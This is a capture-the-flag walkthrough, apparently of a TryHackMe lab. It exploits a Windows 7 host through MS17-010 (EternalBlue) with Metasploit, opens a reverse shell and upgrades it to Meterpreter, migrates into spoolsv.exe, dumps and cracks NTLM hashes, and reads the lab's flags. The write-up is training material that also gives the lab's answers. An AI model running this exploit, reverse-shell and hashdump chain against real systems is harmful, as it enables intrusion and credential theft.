# Task 1 Recon
	- Simple nmap scan
```                                                                         
	$ sudo nmap -sV -sC --script vuln <target-IP>
	[sudo] password for kali: 
	Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-20 12:59 -0400
	Stats: 0:02:07 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
	NSE Timing: About 99.90% done; ETC: 13:02 (0:00:00 remaining)
	Nmap scan report for <target-IP>
	Host is up (0.17s latency).
	Not shown: 992 closed tcp ports (reset)
	PORT      STATE SERVICE      VERSION
	135/tcp   open  msrpc        Microsoft Windows RPC
	139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
	3389/tcp  open  tcpwrapped
	|_ssl-ccs-injection: No reply from server (TIMEOUT)
	49152/tcp open  msrpc        Microsoft Windows RPC
	49153/tcp open  msrpc        Microsoft Windows RPC
	49154/tcp open  msrpc        Microsoft Windows RPC
	49160/tcp open  msrpc        Microsoft Windows RPC
	Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
	
	Host script results:
	| smb-vuln-ms17-010: 
	|   VULNERABLE:
	|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
	|     State: VULNERABLE
	|     IDs:  CVE:CVE-2017-0143
	|     Risk factor: HIGH
	|       A critical remote code execution vulnerability exists in Microsoft SMBv1
	|        servers (ms17-010).
	|           
	|     Disclosure date: 2017-03-14
	|     References:
	|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
	|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
	|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
	|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
	|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
	|_smb-vuln-ms10-054: false
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 152.68 seconds
```
  
## Q1: no answer required
	
## Q2: Ports under 1000 
Answer: 3 in total
	
## Q3: What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
	Answer: MS17-010 clearly visible from nmap when --script vuln used.
	

# Task 2: Gain Access
	
## Q1: no answer required

## Q2: Find the exploit code we will run against the machine:
	
Start msfconsole then search for ms17_010, option 0 contains:
Answer: exploit/windows/smb/ms17_010_eternalblue the question is vague but it's pretty obvious this is the first one that matches. The all start exploit/windows/smb/. The answer is rated average, one below is rated great and should have been a better bet:

27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
	
Next to select exploit enter :
	use 0

## Q3 :Use show options to learn what needs changing:
	Answer: RHOSTS
	
Then enter the RHOST IP with:
	Set RHOSTS <target-IP>
	
## Q4: Then change the payload to the given:  no response required
	set payload windows/x64/shell/reverse_tcp
	
## Q5: Run no response required
	Then run and a meterpreter prompt appears.
	
	This states background using ctrl + Z, here is a summary of the important commands here:
	Command	Does
	ctrl+Z	            Background current session
	sessions -l	        Lists current sessions running
	sessions -I <ID>	  Interact with session <ID>
	ssessions -k <ID> 	Kill the session <ID>, if unstable will close on their own.
	Sessions -K	        Kills all sessions running
	
	
# Task3: 
## Q1: Research online how to convert a shell to meterpreter shell in metasploit
	
Quick google search for meterpreter shell in metasploit and a rapid7 link appears (module_name below).
	
	post/multi/manage/shell_to_meterpreter
	
To use just type:
	
	use module_name
	
## Q2: The next question is the see what options need to be filled. That is just show options.
4 options appear one for answer is 7 characters so:
Answer: session
	
## Q3: find relevant session to use the POST module to upgrade it, no response required.
	
To list session options enter sessions -l
Shows same as just typing 'sessions'
```
  msf post(multi/manage/shell_to_meterpreter) > sessions
```	
	
## Q4 Run meterpreter shell, no response required

## Q5 just tells you to restart the target if it fails and it will likely fail several times.
	
Showed the following output: 
```
  msf6 post(multi/manage/shell_to_meterpreter) > set session 1
	session => 1
	msf6 post(multi/manage/shell_to_meterpreter) > run
	[*] Upgrading session ID: 1
	[*] Starting exploit/multi/handler
	[*] Started reverse TCP handler on 10.65.120.194:4433 
	[*] Post module execution completed
	msf6 post(multi/manage/shell_to_meterpreter) > 
	[*] Sending stage (203846 bytes) to 10.65.143.30
	[*] Meterpreter session 2 opened (10.65.120.194:4433 -> 10.65.143.30:49302) at 2026-03-27 17:08:32 +0000
	[*] Stopping exploit/multi/handler
```	
	
Then as it suggests session 2 is opened and is now listed in the sessions list. 
```	
	msf6 post(multi/manage/shell_to_meterpreter) > sessions -l
	
	Active sessions
	===============
	
	  Id  Name  Type                Information         Connection
	  --  ----  ----                -----------         ----------
	  1         shell x64/windows   Shell Banner: Micr  <local-host>:4444
	                                osoft Windows [Ver  -> <target-IP>:493
	                                sion 6.1.7601] ---  00 (<target-IP>)
	                                --
	  2         meterpreter x64/wi  NT AUTHORITY\SYSTE  <local-host>:4433
	            ndows               M @ JON-PC          -> <target-IP>:493
	                                                    02 (<target-IP>)
```

Note: the first time I tried session -l in earlier stage this just showed: 
ID 1 shell x64/Windows. 
You need to run post exploit on session 1 to get session 2 to show ID 2 Meterpreter x64/Windows in sessions -l. Then you run session 2 for more stable meterpreter shell (just sessions -i 2 to run in meterpreter, this may vary check sessions -l for correct ID number).

Now it has run the post module we can re-enter the shell using session -i <ID>.
```
msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...
```
	
## Q6: Next verify access to NT AUTHORITY\SYSTEM
	- Use meterpreters getuid
	- To determine current ownership permissions open a dos shell via the command 'shell' and run 'whoami' 
	Here it's already NT AUTHORITY\SYSTEM
	- open a dos shell via the command 'shell' and run 'whoami' 

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > shell
Process 9456 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>^Z
Background channel 1? [y/N]  y
Ctrl z Here just backgrounds the command shell to get back to meterpreter.
```

## Force upgrade if not done using getsystem

getsystem is a Meterpreter privilege‑escalation helper.
It tries several built‑in techniques to elevate the current Meterpreter session to NT AUTHORITY\SYSTEM if possible.

Upgrade using getsystem meterpreter command:
```
meterpreter > getsystem
[-] Already running as SYSTEM
```
 
# Next step is to migrate to a more stable process:
This is very unstable in its present state meterpreter seems to hold for up to 5 minutes before session closes itself. Not part of CTF but to make it easier.
	
Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time. 
	
Some meterpreter shells may be unstable you can migrate the process to another more stable existing process like the spoolsv.exe process which always runs with the NT AUTHORITY\SYSTEM  and matches the architecture of the system. This process if it crashes will respawn and won't break the system it's on. Next we will be dumping lsaas hashes from the system and this wont be possible unless the process matches the systems infrastructure making spoolsv.exe perfect for this task.
	
## To migrate we use 
```
  migrate process_ID
```
	
Process migrated to must match the privilege level in this case nt authority\system and should be a stable process that is likely to respawn if it crashes without taking system down. They should also run for long periods.
	
## Processes that run for long periods
Examples (conceptually):
		- System services
		- Explorer.exe (user shell)
		- Browser processes
		- Antivirus services (ironically stable, but dangerous to touch)
Why defenders care: Long‑running processes hide persistence better and blend into normal system behavior.
	
## Match the user’s privilege level
If the attacker is SYSTEM, they need a SYSTEM process. If they are a user, they need a user‑level process. Why defenders care: Privilege mismatches are a detection signal.
	
### Have consistent CPU/memory usage
	Processes that spike or behave oddly stand out in EDR logs.
	Why defenders care: Injected code often changes a process’s behavior profile.
	
### Are not protected or hardened
	Some processes are dangerous to touch:
		- AV/EDR processes
		- LSASS
		- Winlogon
		- CSRSS
	Why defenders care: Tampering with these is a high‑confidence alert.
	
	Match the attacker’s infrastructure
	This is the part you asked about.
	Conceptually, attackers choose processes that:
		- Have network access
		- Use similar protocols (e.g., HTTP/S)
		- Already talk to the internet
		- Won’t look suspicious making outbound connections
	Why defenders care: Outbound traffic from unusual processes is a classic IOC.
	
	Now to get to more stable process we need to check processes available first:
```
  meterpreter > ps
	
	Process List
	============
	
	 PID    PPID  Name        Arch  Session  User             Path
	 ---    ----  ----        ----  -------  ----             ----
	 0      0     [System Pr
	              ocess]
	 4      0     System      x64   0
	 396    664   LogonUI.ex  x64   1        NT AUTHORITY\SY  C:\Windows\syst
	              e                          STEM             em32\LogonUI.ex
	                                                          e
	…
	9768   712   spoolsv.ex  x64   0        NT AUTHORITY\SY  C:\Windows\Syst
	              e                          STEM             em32\spoolsv.ex
```	
	
Its present alternatively use grep if service to migrate to is known:
```
	meterpreter > ps | grep spool
	Filtering on 'spool'
	
	Process List
	============
	
	 PID   PPID  Name        Arch  Session  User            Path
	 ---   ----  ----        ----  -------  ----            ----
	 1336  716   spoolsv.ex  x64   0        NT AUTHORITY\S  C:\Windows\Syst
	             e                          YSTEM           em32\spoolsv.ex
	                                                        e
	
	meterpreter > migrate 1336
	[*] Migrating from 816 to 1336...
	[*] Migration completed successfully.
	meterpreter > 
```

# Task 4: Cracking

## Q1: What is the name of the non-default user? 
```	
	meterpreter > hashdump
	Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
	Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
	meterpreter >
```	
	Note downloading the hashes from meterpreter did not work using. Failed with no form of error:
	
Answer: jon


## Try to download the file of hashes but for some reason it failed: This appears to be a fault of TryHackMe everything should have worked I am not sure why.
```
	meterpreter > hashdump > hashes.txt
	meterpreter > download C:\\Windows\\Temp\\hashes.txt /home/kali/Desktop/
```
	
### download command does appear to work:
```	
	C:\Windows\system32>net users > C:\Tempnetusers.txt
	net users > C:\Tempnetusers.txt
```	
### Type the Windows cat equivalent:
```	
	C:\Windows\system32>type C:\Tempnetusers.txt
	type C:\Tempnetusers.txt
	
	User accounts for \\
	
	-------------------------------------------------------------------------------
	Administrator            Guest                    Jon                      
	The command completed with one or more errors.
	
	C:\Windows\system32>
	
	C:\Windows\system32>^Z
	Background channel 1? [y/N]  y
```
	
### Download the file using download and works as expected.
```
  meterpreter > download c:\\Tempnetusers.txt
	[*] Downloading: c:\Tempnetusers.txt -> /root/Tempnetusers.txt
	[*] Downloaded 234.00 B of 234.00 B (100.0%): c:\Tempnetusers.txt -> /root/Tempnetusers.txt
	[*] Completed  : c:\Tempnetusers.txt -> /root/Tempnetusers.txt
	meterpreter >
	
msf6 post(multi/manage/shel
l_to_meterpreter) > ls
[*] exec: ls

burp.json   Instructions  snap
CTFBuilder  Pictures	  Tempnetusers.txt
Desktop     Postman	  thinclient_drives
Downloads   Rooms	  Tools    
Scripts
```
Downloaded file Tempnetusers present not Hash.txt 
```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
meterpreter > background
[*] Backgrounding session 2...
msf6 post(multi/manage/shel
l_to_meterpreter) > loot

Loot
====

host  service  type  name  content  info  path
----  -------  ----  ----  -------  ----  ----

msf6 post(multi/manage/shell_to_meterpreter) > use post/windows/gather/hashdump
msf6 post(windows/gather/hashdump) > session -i 2
[-] Unknown command: session. Did you mean sessions? Run the help command for more details.
msf6 post(windows/gather/hashdump) > show options

Module options (post/windows/gather/hashdump):

   Name     Current   Required  Descriptio
            Setting             n
   ----     --------  --------  ----------
   SESSION            yes       The session
                                to run this
                                module on

View the full module info with the info, or info -d command.

msf6 post(windows/gather/hashdump) > set session 2
session => 2
msf6 post(windows/gather/hashdump) > run
[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 55bd17830e678f18a3110daf2c17d4c7...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hints...

Jon:"Nah boi, I ain't sharing nutting with you"

[*] Dumping password hashes...

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::


[*] Post module execution completed

Results from this should be in loot its not working as expected

msf6 post(windows/gather/hashdump) > loot

Loot
====

host  service  type  name  content  info  path
----  -------  ----  ----  -------  ----  ----

msf6 post(windows/gather/hashdump) > 


Empty should have had a credentials here, checked permissions and they were normal for the loot folder and would have thrown error:

root@ip-10-66-120-76:~/.msf4# ls -la loot
total 8
drwxr-xr-x  2 root root 4096 Aug 14  2020 .
drwxrwxrwx 13 root root 4096 Mar 28 04:54 ..
root@ip-10-66-120-76:~/.msf4# 
```


This does not change anything we just go back to copy into nano and crack the passwords collected in next question.

## Q2: Copy this password hash to a file and research how to crack it. What is the cracked password?

Just used copy then placed in nano in file hash.txt then used john to process only the 'jon' user password found using rockyou.txt

```
root@ip-10-66-120-76:~# john hash.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
                 (Administrator)
alqfna22         (Jon)
2g 0:00:00:08 DONE (2026-03-28 05:06) 0.2463g/s 1256Kp/s 1256Kc/s 1256KC/s alr1979..alpus
Warning: passwords printed above might not be all those cracked
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed. 
root@ip-10-66-120-76:~# 
```
Answer: alqfna22 


# Task 5 Find flags:
Use meterpreter session 2 then use shell command to enter the command line of windows. Then find flag in user 'jon' directories:

## Q1: Flag1 in root directory:
```
C:\>dir *.txt
dir *.txt
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\

03/17/2019  02:27 PM                24 flag1.txt
03/27/2026  11:43 PM               234 Tempnetusers.txt
               2 File(s)            258 bytes
               0 Dir(s)  20,442,566,656 bytes free


C:\>type flag1.txt
type flag1.txt
flag{access_the_machine}
C:\>
```

## Q2: Flag2? This flag can be found at the location where passwords are stored within Windows.
```
C:\>cd Windows
cd Windows

C:\Windows>cd system32
cd system32

C:\Windows\System32>cd config
cd config

C:\Windows\System32\config>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\Windows\System32\config

03/27/2026  11:21 PM    <DIR>          .
03/27/2026  11:21 PM    <DIR>          ..
12/12/2018  06:00 PM            28,672 BCD-Template
03/27/2026  11:29 PM        18,087,936 COMPONENTS
03/27/2026  11:50 PM           262,144 DEFAULT
03/17/2019  02:32 PM                34 flag2.txt
07/13/2009  09:34 PM    <DIR>          Journal
03/27/2026  11:50 PM    <DIR>          RegBack
03/17/2019  03:05 PM           262,144 SAM
03/27/2026  11:30 PM           262,144 SECURITY
03/28/2026  12:30 AM        40,632,320 SOFTWARE
03/28/2026  12:34 AM        12,320,768 SYSTEM
11/20/2010  09:41 PM    <DIR>          systemprofile
12/12/2018  06:03 PM    <DIR>          TxR
               8 File(s)     71,856,162 bytes
               6 Dir(s)  20,442,566,656 bytes free

C:\Windows\System32\config>type flag2.txt
type flag2.txt
flag{sam_database_elevated_access}
C:\Windows\System32\config>
```

## Q: flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 
```
C:\Users\Jon\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\Users\Jon\Documents

12/12/2018  10:49 PM    <DIR>          .
12/12/2018  10:49 PM    <DIR>          ..
03/17/2019  02:26 PM                37 flag3.txt
               1 File(s)             37 bytes
               2 Dir(s)  20,443,090,944 bytes free
C:\Users\Jon\Documents>type flag3.txt
type flag3.txt
flag{admin_documents_can_be_valuable}
C:\Users\Jon\Documents>
```

